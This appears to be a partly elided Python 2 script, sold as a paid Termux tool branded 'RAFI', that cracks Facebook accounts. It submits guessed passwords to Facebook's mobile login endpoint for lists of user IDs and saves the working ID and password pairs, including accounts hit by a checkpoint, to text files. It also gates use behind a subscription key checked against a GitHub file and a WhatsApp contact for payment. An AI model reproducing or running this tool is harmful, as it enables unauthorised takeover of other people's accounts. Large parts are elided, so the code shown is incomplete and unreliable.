...
logo = "'\x1b[1;92m' __      __  __  ___ _ __  _\n'\x1b[1;92m' \ \    / /  _ \/ _ \ '__|\n'\x1b[1;91m'  \ \  / /  __/  __/ |  \n'\x1b[1;97m'   \ \/ /  \___|\___|_|  \n'\x1b[1;93m'    \  /\n'\x1b[1;94m'     \/ \n\n'\x1b[1;91m'   Author      :     ZIHAD HOSSAIN RAFI     \n'\x1b[1;92m'   YOUTUBE CHANNEL      :    TECHNICAL ZIHAD   \n'\x1b[1;93m'   FB ID       :     zihad.hossain36\n'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;96m'   WAP NUMBER  :     +8801842827520            \n" 
dec = '2'
server = '2'
...
def main_apv():
    ...
    try:
        ...
        print '           Subscription Na korle Please '
        print '           Admin ke SMS Kro Thanks'
        print '           Subscription Korte Enter Press Kro'
        print '           Or Whatsapp a SMS Kro Thanks'
        print ''
        ...
        print ''
        print '           Uporer KEY ta'
        print '           Copy Kore ta WhatsApp ta Whatsup a SMS koro'
        print ''
        print ''
        print ''
        print '     Please Subscription Now Here'
        raw_input('    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ')
        os.system('xdg-open https://wa.me/+8801842827520')

    r1 = requests.get('https://github.com/MR-ZIHAD/HTcrack/blob/main/approve.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        ...
        print ''
        print ''
        print '      Subscription Na Kore thakle'
        raw_input('    Termux  Exit Kore Ka Cammonds Enter koro ')
        os.system('xdg-open https://wa.me/+8801842827520')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In RAFI Paid Commands '
        print '\x1b[1;91m        ENJOY  THIS TOOL '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RAFI-OK] ' + coc + user + ' | ' + pass1
                ok = open('RAFI random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[RAFI-CP] ' + coc + user + ' | ' + pass1
                cp = open('RAFI random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From RAFI : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RAFI-OK] ' + uid + ' | ' + pass1
                ok = open('RAFI-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[RAFI-CP] ' + uid + ' | ' + pass1
                cp = open('RAFI-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[RAFI-OK] ' + uid + ' | ' + pass2
                    ok = open('RAFI-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[RAFI-CP] ' + uid + ' | ' + pass2
                    cp = open('RAFI-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[RAFI-OK] ' + uid + ' | ' + pass3
                        ok = open('RAFI-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[RAFI-CP] ' + uid + ' | ' + pass3
                        cp = open('RAFI-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[RAFI-OK] ' + uid + ' | ' + pass4
                            ok = open('RAFI-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[RAFI-CP] ' + uid + ' | ' + pass4
                            cp = open('RAFI-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[RAFI-OK] ' + uid + ' | ' + pass5
                                ok = open('RAFI-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[RAFI-CP] ' + uid + ' | ' + pass5
                                cp = open('RAFI-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def n_p_pass():
    ...
    os.system('echo " -----------------------------------"| lolcat')
    print '        Cracking Start Please Wait .. '
    print ' If ID does not appear, turn on flight mode'
    os.system('echo " -----------------------------------"| lolcat')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[RAFI-CP] ' + uid + ' | ' + pass1
                cp = open('RAFI-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[RAFI-CP] ' + uid + ' | ' + pass2
                    cp = open('RAFI-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[RAFI-CP] ' + uid + ' | ' + pass3
                        cp = open('RAFI-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[RAFI-CP] ' + uid + ' | ' + pass4
                            cp = open('RAFI-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[RAFI-CP] ' + uid + ' | ' + pass5
                                cp = open('RAFI-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[RAFI-OK] ' + uid + ' | ' + pass6
                                    ok = open('RAFI-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[RAFI-CP] ' + uid + ' | ' + pass6
                                    cp = open('RAFI-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
